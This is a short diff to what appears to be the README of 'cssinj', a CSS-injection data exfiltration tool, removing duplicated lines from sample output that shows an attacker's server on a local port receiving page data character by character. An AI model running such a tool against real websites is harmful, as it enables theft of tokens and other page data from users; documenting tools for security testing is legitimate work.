@@ -117,9 +117,6 @@ python3 -m cssinj [-h] -H HOSTNAME -p PORT [-e ELEMENT] [-a ATTRIBUT] [-d] [-m {
 [2025-05-21 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
 [2025-05-21 03:06:49] 🌐 Connection from 127.0.0.1
 [2025-05-21 03:06:49] ⚙️ ID : 1
-[2025-05-21 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
-[2025-05-21 03:06:49] 🌐 Connection from 127.0.0.1
-[2025-05-21 03:06:49] ⚙️ ID : 1
 [2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 :  
 [2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : e
 [2025-05-21 03:06:49] 🔎 [1] - Exfiltrating element 0 : W
